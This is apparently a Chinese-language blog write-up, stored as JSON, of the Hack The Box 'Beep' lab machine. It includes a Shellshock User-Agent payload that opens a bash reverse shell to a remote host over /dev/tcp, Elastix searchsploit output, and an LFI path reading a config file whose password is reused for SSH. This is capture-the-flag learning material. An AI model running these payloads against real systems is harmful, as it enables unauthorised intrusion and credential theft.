{"title":"Hack The Box Beep","date":"2019-05-17T07:48:33.000Z","slug":"Hack-The-Box-Beep","updated":"2019-05-17T08:26:35.517Z","content":"<h3 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h3><p>nmap来一波<br><img src=\"/img/BeepNmap.png\" alt=\"我是图片\">。<br>感觉上又很多点。</p>\n<h3 id=\"bash漏洞\"><a href=\"#bash漏洞\" class=\"headerlink\" title=\"bash漏洞\"></a>bash漏洞</h3><p>打开10.10.10.7:10000，发现是个登陆窗口。<br><img src=\"/img/BeepLogin.png\" alt=\"我是图片\">。</p>\n<p>利用burpsuite抓包，发现这个url是个cgi。所以试一试bash漏洞。<br><img src=\"/img/wget.png\" alt=\"我是图片\">。<br>利用python的SimpleHTTPServer模块。<br><img src=\"/img/wget2.png\" alt=\"我是图片\">。<br>发现我们的命令被执行了。执行如下步骤：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 8081</span><br><span class=\"line\"><span class=\"comment\"># 设置User-Agent的值如下</span></span><br><span class=\"line\">() &#123; :;&#125;; bash -i &gt;&amp; /dev/tcp/10.10.14.25/8081 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>\n<p>得到shell，竟然是个root权限= =。<br><img src=\"/img/success2.png\" alt=\"我是图片\">。<br><img src=\"/img/success3.png\" alt=\"我是图片\">。</p>\n<h3 id=\"elastic漏洞\"><a href=\"#elastic漏洞\" class=\"headerlink\" title=\"elastic漏洞\"></a>elastic漏洞</h3><p>打开10.10.10.7，发现是个elastix的软件。利用searchsploit进行漏洞查找。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:~/Desktop# searchsploit elastix</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class=\"line\"> Exploit Title                                                                                                                                                           |  Path</span><br><span class=\"line\">                                                                                                                                                                         | (/usr/share/exploitdb/)</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class=\"line\">Elastix - &apos;page&apos; Cross-Site Scripting                                                                                                                                    | exploits/php/webapps/38078.py</span><br><span class=\"line\">Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                  | exploits/php/webapps/38544.txt</span><br><span class=\"line\">Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                            | exploits/php/webapps/34942.txt</span><br><span class=\"line\">Elastix 2.2.0 - &apos;graph.php&apos; Local File Inclusion                                                                                                                         | exploits/php/webapps/37637.pl</span><br><span class=\"line\">Elastix 2.x - Blind SQL Injection                                                                                                                                        | exploits/php/webapps/36305.txt</span><br><span class=\"line\">Elastix &lt; 2.5 - PHP Code Injection                                                                                                                                       | exploits/php/webapps/38091.php</span><br><span class=\"line\">FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                   | exploits/php/webapps/18650.py</span><br><span class=\"line\">------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class=\"line\">Shellcodes: No Result</span><br></pre></td></tr></table></figure></p>\n<p>这里的’graph.php’ Local File Inclusion 是可以用的。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span><br></pre></td></tr></table></figure></p>\n<p>发现里面有个密码为jEhdIekWmdjE。试试ssh。</p>\n<p><img src=\"/img/BeepRoot.png\" alt=\"我是图片\">。</p>\n","next":{"title":"Hack The Box Popcorn","slug":"Hack-The-Box-Popcorn"},"link":"https://foyjog.github.io/post/Hack-The-Box-Beep/"}